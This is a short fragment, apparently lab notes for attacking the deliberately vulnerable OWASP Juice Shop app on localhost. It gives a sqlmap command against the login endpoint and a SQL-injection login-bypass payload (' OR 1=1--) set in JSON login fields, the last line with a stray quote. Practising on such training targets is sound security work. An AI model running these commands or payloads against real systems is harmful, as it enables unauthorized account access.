sqlmap -u "http://localhost:3000/rest/user/login" \
  --data='email=admin@juice-sh.op&password=test' \
  --method=POST --batch --risk=2 --level=2
  
login fields {"email":"\' OR 1=1--","password":"x"}'
